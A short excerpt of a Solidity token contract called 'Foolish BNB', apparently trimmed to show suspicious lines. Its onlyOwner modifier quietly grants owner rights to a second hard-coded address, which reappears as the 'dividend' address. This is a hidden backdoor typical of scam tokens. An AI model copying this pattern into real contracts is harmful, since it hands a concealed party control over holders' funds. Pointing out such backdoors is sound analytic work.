...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x276f3C22d0673e1beDc0D6A0e7829AFEd1191c55) , "owner");
        _;
    }
...
contract ass  is Context, IERC20, Ownable {
    ...
    string private _name = "Foolish BNB";
    string private _symbol = "Foolish BNB";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x9179AF948653dE668557432D3a4Efdf39eE0e66F);
    address private _Marketing = 0x9179AF948653dE668557432D3a4Efdf39eE0e66F;
    address public dividend = 0x276f3C22d0673e1beDc0D6A0e7829AFEd1191c55;
